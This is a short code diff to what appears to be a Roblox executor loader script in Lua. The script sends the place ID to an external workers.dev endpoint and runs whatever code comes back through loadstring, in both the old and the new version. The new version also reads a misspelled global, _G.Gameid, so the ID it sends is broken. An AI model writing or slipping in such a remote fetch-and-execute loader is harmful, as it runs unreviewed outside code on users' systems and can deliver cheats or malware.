@@ -1,28 +1,19 @@
-if _G.ScriptFetchCode then
-    return
-end
-_G.ScriptFetchCode = true
-_G.GameeId =  4924922222 
+_G.GameId = game.PlaceId
+local v8 = "https://crimson-firefly-6874.nothingpanel00.workers.dev/"
 
-local HttpService = game:GetService("HttpService")
-local GameID = game.gameId 
-local GameId = _G.GameId 
-
-if not GameId then
-    warn("id is missing")
-    return
-end
-
--- request for code
 local response = request({
-    Url = "https://crimson-firefly-6874.nothingpanel00.workers.dev/validate",
+    Url = v8,
     Method = "POST",
     Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode({id = GameId})})
-    if response.StatusCode == 200 then
-    local source = response.Body
-    loadstring(source)()
-end  
-        
-    
-print("Hello, req sent!")
+    Body = game:GetService("HttpService"):JSONEncode({
+        id = _G.Gameid
+    })
+})
+if response.StatusCode == 200 then
+    local execute = loadstring(response.Body)
+    if execute then
+        execute()
+    end
+else
+    warn(" failed . Status: " .. tostring(response.StatusCode))
+end
